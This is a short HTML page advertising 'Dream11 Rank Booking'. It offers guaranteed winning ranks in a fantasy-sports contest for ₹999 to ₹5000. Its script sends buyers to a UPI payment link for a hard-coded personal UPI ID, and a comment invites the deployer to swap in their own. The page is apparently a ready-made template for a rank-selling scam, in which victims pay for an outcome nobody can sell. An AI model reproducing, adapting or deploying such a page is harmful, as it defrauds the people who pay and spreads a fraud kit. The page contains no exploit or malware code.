<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Dream11 Rank Booking</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; background: #f4f4f4; text-align: center; }
    table { margin: auto; border-collapse: collapse; }
    th, td { padding: 10px 20px; border: 1px solid #ccc; }
    button {
      background-color: #28a745; color: white; border: none;
      padding: 10px 20px; border-radius: 5px; cursor: pointer;
    }
    button:hover { background-color: #218838; }
  </style>
</head>
<body>
  <h1>Book Your Winning Rank</h1>
  <table>
    <tr><th>Rank</th><th>Prize</th><th>Action</th></tr>
    <tr><td>1</td><td>₹5000</td><td><button onclick="pay('5000')">Book Now</button></td></tr>
    <tr><td>2</td><td>₹3999</td><td><button onclick="pay('3999')">Book Now</button></td></tr>
    <tr><td>3</td><td>₹2999</td><td><button onclick="pay('2999')">Book Now</button></td></tr>
    <tr><td>4</td><td>₹1999</td><td><button onclick="pay('1999')">Book Now</button></td></tr>
    <tr><td>5</td><td>₹999</td><td><button onclick="pay('999')">Book Now</button></td></tr>
  </table>

  <script>
    function pay(amount) {
      // Replace with your UPI ID and thank-you.html page
      const upi = '6005973034@ybl';
      const name = 'ramchoudhary';
      const url = `upi://pay?pa=${upi}&pn=${name}&cu=INR&am=${amount}`;
      window.location.href = url;

      // Optional: delay redirect to thank-you page
      setTimeout(() => {
        window.location.href = "thank-you.html";
      }, 3000); // 3 seconds
    }
  </script>
</body>
</html>
